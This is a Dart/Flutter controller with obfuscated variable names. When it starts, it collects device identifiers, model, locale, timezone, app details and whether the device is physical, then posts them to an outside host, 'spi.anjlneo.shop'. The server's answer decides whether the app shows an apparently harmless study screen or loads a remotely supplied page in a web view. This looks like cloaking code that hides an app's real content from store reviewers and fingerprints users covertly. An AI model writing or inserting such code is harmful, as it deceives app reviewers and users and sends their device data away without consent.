import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var thredaznum = RxBool(false);
  var pwjkfzahm = RxBool(true);
  var ixknywup = RxString("");
  var trenton = RxBool(false);
  var witting = RxBool(true);
  final kynqlxh = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ykfjbe();
  }


  Future<void> ykfjbe() async {

    trenton.value = true;
    witting.value = true;
    pwjkfzahm.value = false;

    kynqlxh.post("https://spi.anjlneo.shop/ACOUEEIMJ",data: await tiacrkpxog()).then((value) {
      var caow = value.data["caow"] as String;
      var hgtpzwrf = value.data["hgtpzwrf"] as bool;
      if (hgtpzwrf) {
        ixknywup.value = caow;
        mikel();
      } else {
        ward();
      }
    }).catchError((e) {
      pwjkfzahm.value = true;
      witting.value = true;
      trenton.value = false;
    });
  }

  Future<Map<String, dynamic>> tiacrkpxog() async {
    final DeviceInfoPlugin usezb = DeviceInfoPlugin();
    PackageInfo jpwe_coxp = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var mdyiqank = Platform.localeName;
    var ywzpkvab = currentTimeZone;

    var ajisezwd = jpwe_coxp.packageName;
    var ktnlh = jpwe_coxp.version;
    var lhow = jpwe_coxp.buildNumber;

    var xaumpr = jpwe_coxp.appName;
    var barryAbbott = "";
    var utfkrj  = "";
    var miltonVonRueden = "";
    var rickeyFranecki = "";
    var ahnuvk = "";
    var yfwdoze = "";
    var goldaMcDermott = "";
    var janieWalsh = "";


    var qdntokc = "";
    var txkgrm = false;

    if (GetPlatform.isAndroid) {
      qdntokc = "android";
      var ogmjkh = await usezb.androidInfo;

      ahnuvk = ogmjkh.brand;

      yfwdoze  = ogmjkh.model;
      utfkrj = ogmjkh.id;

      txkgrm = ogmjkh.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      qdntokc = "ios";
      var ydmearpus = await usezb.iosInfo;
      ahnuvk = ydmearpus.name;
      yfwdoze = ydmearpus.model;

      utfkrj = ydmearpus.identifierForVendor ?? "";
      txkgrm  = ydmearpus.isPhysicalDevice;
    }

    var res = {
      "lhow": lhow,
      "goldaMcDermott" : goldaMcDermott,
      "ktnlh": ktnlh,
      "yfwdoze": yfwdoze,
      "ywzpkvab": ywzpkvab,
      "xaumpr": xaumpr,
      "ahnuvk": ahnuvk,
      "janieWalsh" : janieWalsh,
      "utfkrj": utfkrj,
      "ajisezwd": ajisezwd,
      "mdyiqank": mdyiqank,
      "qdntokc": qdntokc,
      "txkgrm": txkgrm,
      "barryAbbott" : barryAbbott,
      "rickeyFranecki" : rickeyFranecki,
      "miltonVonRueden" : miltonVonRueden,

    };
    return res;
  }

  Future<void> ward() async {
    Get.offAllNamed("/studyTab");
  }

  Future<void> mikel() async {
    Get.offAllNamed("/studyEdit");
  }

}
